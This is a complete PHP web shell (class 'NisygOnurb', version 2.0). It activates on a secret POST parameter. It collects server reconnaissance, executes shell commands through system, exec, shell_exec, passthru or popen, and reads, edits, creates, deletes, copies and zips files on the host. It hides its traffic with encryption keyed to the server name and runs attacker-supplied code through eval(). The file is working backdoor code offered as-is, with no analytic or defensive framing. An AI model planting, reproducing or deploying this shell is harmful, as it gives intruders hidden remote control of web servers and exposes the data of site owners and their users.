<?php error_reporting(0); ini_set('display_errors', 0); header('Connection-Mode: Keep-Length'); if(!empty($_POST['F5A0003DA3A137358955F72B177A7F0B'])){ Class NisygOnurb{ var $ShellVersion = '2.0'; 			var $win = false; var $DisableFuncs = ''; 			var $Send = Array(); 			 function __construct() { $this->win = (@strtolower(@substr(PHP_OS,0,3)) == 'win') ? true : false; $this->DisableFuncs = @ini_get("disable_functions"); if (!empty($this->DisableFuncs)){ $this->Send['DisableFuncs'] = @explode(",",$this->DisableFuncs); }else{ $this->Send['DisableFuncs'] = false; } $DISP_SERVER_SOFTWARE = @getenv("SERVER_SOFTWARE"); if (@!ereg("PHP/".@phpversion(),$DISP_SERVER_SOFTWARE)){ $DISP_SERVER_SOFTWARE .= ". PHP/".@phpversion(); } $this->Send['software'] = $DISP_SERVER_SOFTWARE; $this->Send['uname'] = @wordwrap(@php_uname(),90,"<br>",1); if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){ $this->Send['SafeMode'] = true; }else{ $this->Send['SafeMode'] = false; } $open_basedir = @ini_get("open_basedir"); if ($open_basedir or strtolower($open_basedir) == "on"){ $this->Send['open_basedir'] = $open_basedir; }else{ $this->Send['open_basedir'] = false; } if (!$this->win) { $this->Send['uid'] = wordwrap($this->myshellexec("id"),90,"<br>",1); } else { $this->Send['uid'] = @get_current_user(); } $arrfunc = array( array("MySQL","mysql_connect"), array("MSSQL","mssql_connect"), array("Oracle","ocilogon"), array("PostgreSQL","pg_connect"), array("Curl","curl_version"), ); $arrcmd = array( array("Fetch","fetch --help"), array("Wget","wget --help"), array("Perl","perl -v"), ); $statinfo = array(); foreach ($arrfunc as $func){ if (function_exists($func[1])) { $statinfo[] = Array($func[0], true); }else{ $statinfo[] = Array($func[0], false); } } if((@extension_loaded('sockets'))){ $statinfo[] = Array('Sockets', true); }else{ $statinfo[] = Array('Sockets', False); } foreach ($arrcmd as $cmd) { if ($this->myshellexec($cmd[1])){ $statinfo[] = Array($cmd[0], true); }else{ $statinfo[] = Array($cmd[0], false); } } $this->Send['GetStatus'] = $statinfo; if (is_callable("disk_free_space")){ $free = disk_free_space('.'); $total = disk_total_space('.'); if ($free === FALSE) {$free = 0;} if ($total === FALSE) {$total = 0;} if ($free < 0) {$free = 0;} if ($total < 0) {$total = 0;} $used = $total-$free; $free_percent = round(100/($total/$free),2); $this->Send['space_disk']['free'] = $free; $this->Send['space_disk']['freeH'] = $this->view_size($free); $this->Send['space_disk']['total'] = $total; $this->Send['space_disk']['totalH'] = $this->view_size($total); $this->Send['space_disk']['percent'] = $free_percent; } $this->Send['upload_max_filesize'] = @ini_get("upload_max_filesize"); $this->Send['ShellVersion'] = $this->ShellVersion; } function ShowDirInfos($DirPath){ $DirPath = $this->VerifyPath($DirPath); $ShelllMD5 = @md5_file(__FILE__); $Dir = array(); if ($h = @opendir($DirPath)) { while (($o = readdir($h)) !== FALSE) {$Dir[] = $DirPath.$o;} closedir($h); } if (count($Dir) == 0) { $this->SendReturn(); return; } $objects = array(); $FileId = 0; foreach(@$Dir as $v) { $o = basename($v); $row = array(); $Size = 0; if(@is_file($v)) $Size = @filesize($v); $FileCreateTime = @filectime($v); $FileAccessTime = @fileatime($v); $FileModifyTime = @filemtime($v); $chmod = @fileperms($v); $DirChmod = @fileperms($DirPath); $MD5 = @md5_file($v); $Owner = @$this->enabled("posix_getpwuid") ? @posix_getpwuid(@fileowner($v)) : ''; $Group = @$this->enabled("posix_getgrgid") ? @posix_getgrgid(@filegroup($v)) : ''; $Ext = @pathinfo($v, PATHINFO_EXTENSION); $mime_content_type = ''; if (function_exists('mime_content_type')) { $mime_content_type = @mime_content_type($v); }else{ $mime_content_type = $this->getMimeType($v); } $is_readable = @is_readable($v); $is_writable = @is_writable($v); $row['name'] = $o; $row['FilePath'] = $DirPath.$o; $row['size'] = $Size; $row['sizeH'] = $this->view_size($Size); $row['filemodifytime'] = $FileModifyTime; $row['Ext'] = $Ext; $row['mime_content_type'] = $mime_content_type; $row['MD5'] = $MD5; $row['chmod'] = $chmod; $row['DirChmod'] = $DirChmod; $row['is_readable'] = $is_readable; $row['is_writable'] = $is_writable; $row['Owner'] = $Owner; $row['Group'] = $Group; $row['Owner_Group'] = (@$Owner["name"] ? @$Owner["name"] : @fileowner($v))."/".(@$Group["name"] ? @$Group["name"]: @filegroup($v)); if($MD5 == $ShelllMD5){ $row['Special'] = true; } if (($o == ".") or ($o == "..")) {$row['IsType'] = 'dir'; $objects["head"][] = $row;} elseif (@is_link($v)) {$row['IsType'] = 'link'; $objects["links"][] = $row;} elseif (@is_dir($v)) {$row['IsType'] = 'dir'; $objects["folders"][] = $row;} elseif (@is_file($v)) {$row['IsType'] = 'file'; $objects["files"][] = $row;} } $is_readable = @is_readable($DirPath); $is_writable = @is_writable($DirPath); $chmod = @fileperms($DirPath); $this->Send['dir']['is_readable'] = $is_readable; $this->Send['dir']['is_writable'] = $is_writable; $this->Send['dir']['chmod'] = $chmod; $this->Send['dir']['Objects'] = $objects; $this->SendReturn(); exit; } function DownloadFile($FilePath){ $FilePath = $this->VerifyPath($FilePath); $tipo=''; if(@file_exists($FilePath)){ $this->Send['file_exists'] = true; switch(strtolower(substr(strrchr(basename($FilePath),"."),1))){ case "pdf": $tipo="application/pdf"; break; case "exe": $tipo="application/octet-stream"; break; case "zip": $tipo="application/zip"; break; case "doc": $tipo="application/msword"; break; case "xls": $tipo="application/vnd.ms-excel"; break; case "ppt": $tipo="application/vnd.ms-powerpoint"; break; case "gif": $tipo="image/gif"; break;  case "png": $tipo="image/png"; break;  case "jpg": $tipo="image/jpg"; break;  case "mp3": $tipo="audio/mpeg"; break; case "php": case "htm":  case "html": } $this->Send['header'] = Array(); $this->Send['header'][0] = "Content-Type: ".$tipo;  $this->Send['header'][2] = "Content-Length: ".filesize($FilePath); $this->Send['header'][1] = "Content-Disposition: attachment; filename=".basename($FilePath); $FileText = @file_get_contents($FilePath); $FileText = $this->strToHex($FileText); $this->Send['download'] = $FileText; }else{ $this->Send['file_exists'] = false; } $this->SendReturn(); exit; } function EditFile($FilePath, $Contend){ $FilePath = $this->VerifyPath($FilePath); if(@file_exists($FilePath)){ if(@file_put_contents($FilePath, $Contend)){ $this->Send['EditFile'] = true; }else{ $this->Send['EditFile'] = false; } }else{ $this->Send['EditFile'] = 'FILE_NOT_EXISTS'; } $this->Send['EditFilesErrors'] = error_get_last(); $this->DownloadFile($FilePath); } function CreateFile($FilePath, $FileName, $Contend){ $FilePath = $this->VerifyPath($FilePath); if(@!file_exists($FilePath.$FileName) OR true){ if(@file_put_contents($FilePath.$FileName, $Contend)){ $this->Send['CreateFile'] = true; }else{ $this->Send['CreateFile'] = false; } }else{ $this->Send['CreateFile'] = 'FILE_EXISTS'; } $this->ShowDirInfos($FilePath); $this->SendReturn(); } function CreateDir($PathDir, $DirName){ $PathDir = $this->VerifyPath($PathDir); $this->Send['CreateDir'] = false; if(@mkdir($PathDir.$DirName, 0777, true)){ $this->Send['CreateDir'] = true; } $this->ShowDirInfos($PathDir); $this->SendReturn(); } function DeleteDirOrFile($Delete, $SendReturn = true){ if(is_dir($Delete)){ $this->Send['is_dir'] = true; $this->Send['DelDir'] = false; $files = @array_diff(@scandir($Delete), array('.','..'));  foreach (@$files as $file) {  (@is_dir("$Delete/$file")) ? $this->DeleteDirOrFile("$Delete/$file") : @unlink("$Delete/$file");  }  if(rmdir($Delete)){ $this->Send['DelDir'] = true; } }else{ $this->Send['is_dir'] = false; $this->Send['DelFile'] = false; if(@unlink($Delete)){ $this->Send['DelFile'] = true; } } if($SendReturn){ $this->SendReturn(); } } function RenameDirOrFile($CurrentPath, $OldName, $NewName){ $CurrentPath = $this->VerifyPath($CurrentPath); if(!file_exists($CurrentPath.$NewName)){ if(@rename($CurrentPath.$OldName, $CurrentPath.$NewName)){ $this->Send['RenameDirOrFile'] = true; }else{ $this->Send['RenameDirOrFile'] = false; } }else{ $this->Send['RenameDirOrFile'] = false; } $this->ShowDirInfos($CurrentPath); } function MultipleDelete($Files = Array(), $PathDir) { $this->Send['MultipleDelete'] = Array(); $PathDir = $this->VerifyPath($PathDir); foreach(@$Files as $value){ $this->DeleteDirOrFile($PathDir.$value, false); } $this->ShowDirInfos($PathDir); } function PasteCopy($FilesAndDirs, $FromPath, $ToPath){ $this->Send['PasteCopy'] = Array(); $FromPath = $this->VerifyPath($FromPath); $ToPath = $this->VerifyPath($ToPath); foreach(@$FilesAndDirs as $value){ if(@copy($FromPath.'/'.$value, $ToPath.$value)){ $this->Send['PasteCopy'][$value] = true; }else{ $this->Send['PasteCopy'][$value] = false; } } $this->ShowDirInfos($ToPath); } function PasteCut($FilesAndDirs, $FromPath, $ToPath){ $this->Send['PasteCut'] = Array(); $FromPath = $this->VerifyPath($FromPath); $ToPath = $this->VerifyPath($ToPath); foreach(@$FilesAndDirs as $value){ if(@rename($FromPath.'/'.$value, $ToPath.'/'.$value)){ $this->Send['PasteCut'][$value] = true; }else{ $this->Send['PasteCut'][$value] = false; } } $this->ShowDirInfos($ToPath); } function CreateZIP($FilesPath, $files = array(),$overwrite = false) { $FilesPath = $this->VerifyPath($FilesPath); $valid_files = array(); if(@is_array($files)) { foreach($files as $file){ if(@file_exists($FilesPath.'/'.$file)) { $valid_files[] = $file; } } } if(@count(@$valid_files) AND @class_exists('ZipArchive')){ $zip = new ZipArchive(); $ZipFileName = date('d-m-Y-B'); if($zip->open($FilesPath.'/'.$ZipFileName.'.zip', $overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true) { $this->Send['CreateZIP'] = false; $this->ShowDirInfos($ToPath); return; } foreach($valid_files as $file) { $Source = realpath($FilesPath.'/'.$file); if(is_dir($Source)){ $AllFiles = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($Source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($AllFiles As $fFile) { if(is_dir($fFile)){ $zip->addEmptyDir(realpath($fFile), str_replace($Source, $file, $fFile)); }else{ $zip->addFile(realpath($fFile), str_replace($Source, $file, $fFile)); } } }else{ $zip->addFile($FilesPath.'/'.$file,$file); } } $zip->close(); $this->Send['CreateZIP'] = true; $this->Send['CreateZIPName'] = $ZipFileName; }else{ $this->Send['CreateZIP'] = false; } $this->ShowDirInfos($FilesPath); } function SendReturn(){ $this->Send['Errors'] = error_get_last(); echo @$this->encrypt(@json_encode($this->Send)); exit; } function getMimeType( $filename ) { $realpath = realpath( $filename ); $this->Send['Debug']['realpath'] = $realpath; if ( $realpath && function_exists( 'finfo_file' ) && function_exists( 'finfo_open' ) && defined( 'FILEINFO_MIME_TYPE' ) ) { $this->Send['Debug']['0'] = 'finfo_file'; return finfo_file( finfo_open( FILEINFO_MIME_TYPE ), $realpath ); } if ( function_exists( 'mime_content_type' ) ) { return mime_content_type( $realpath ); } return false; } function CreateLogs(){ $Infos = @json_decode($this->decrypt($_POST['F5A0003DA3A137358955F72B177A7F0B']), true); $Contend = @print_r($Infos, true); $Contend .= @print_r($this->Send, true); $Contend .= @json_encode($this->Send); $Contend .= '\r\n'; $Contend .= @$this->encrypt(@json_encode($this->Send)); @file_put_contents('logs/'.rand().'.txt', $Contend); } function VerifyPath($Path){ $this->Send['DirPath'] = @dirname(__FILE__); $Path = str_replace("/ADdMyRootDirPath/", @dirname(__FILE__).'/', $Path); $Path = str_replace("ADdMyRootDirPath/", @dirname(__FILE__).'/', $Path); if($this->win == true){ if (empty($Path)) {$Path = @realpath(".");}elseif(@realpath($Path)) {$Path = @realpath($Path);} $Path = str_replace("\\",DIRECTORY_SEPARATOR,$Path); } if(!@is_file($Path)){if (substr($Path,-1) != DIRECTORY_SEPARATOR) {$Path .= DIRECTORY_SEPARATOR;}} $Path = str_replace("\\\\","\\",$Path); return $Path; } function view_size($size){ if (!is_numeric($size)) {return FALSE;} else{ if ($size >= 1073741824) {$size = (round($size/1073741824*100)/100).' GB';} elseif ($size >= 1048576) {$size = (round($size/1048576*100)/100).' MB';} elseif ($size >= 1024) {$size = (round($size/1024*100)/100) .' KB';} else {$size = $size.' B';} return $size; } } function myshellexec($cmd){ $output = ""; if ( $this->enabled("system") ) { @ob_start(); @system($cmd); $output = @ob_get_contents(); @ob_end_clean(); } elseif ( $this->enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); } elseif ( $this->enabled("shell_exec") ) { $output = shell_exec($cmd); } elseif ( $this->enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); } elseif ( $this->enabled("popen") ) { $h = popen($cmd.' 2>&1', 'r'); if ( is_resource($h) ) { while ( !feof($h) ) { $output .= fread($h, 2096);  } pclose($h); } } return $output; } function enabled($func) { if ( @is_callable(@$func) && !@in_array(@$func, @$this->DisableFuncs) ) { return true; } else { return false; } } function encrypt($data) { global $_SERVER; $key = md5($_SERVER['SERVER_NAME']); $iv = md5(md5($key)); return trim(  $this->strToHex( mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $data, MCRYPT_MODE_CBC, $iv))); } function decrypt($data) { global $_SERVER; $key = md5($_SERVER['SERVER_NAME']); $iv = md5(md5($key)); return rtrim( mcrypt_decrypt( MCRYPT_RIJNDAEL_256, md5($key),  $this->hexToStr($data), MCRYPT_MODE_CBC, $iv) , "\0"); } function strToHex($string){ $hex = ''; for ($i=0; $i<strlen($string); $i++){ $ord = ord($string[$i]); $hexCode = dechex($ord); $hex .= substr('0'.$hexCode, -2); } return strToUpper($hex); } function hexToStr($hex){ $string=''; for ($i=0; $i < strlen($hex)-1; $i+=2){ $string .= chr(hexdec($hex[$i].$hex[$i+1])); } return $string; } } $NisygOnurb = new NisygOnurb; $Infos = @json_decode($NisygOnurb->decrypt($_POST['F5A0003DA3A137358955F72B177A7F0B']), true); if($Infos != NULL){ if(is_array($Infos)){ if(@$Infos['Time'] > @time()){ if (@$Infos['Functions']) { @eval($Infos['Functions']); } } } } } 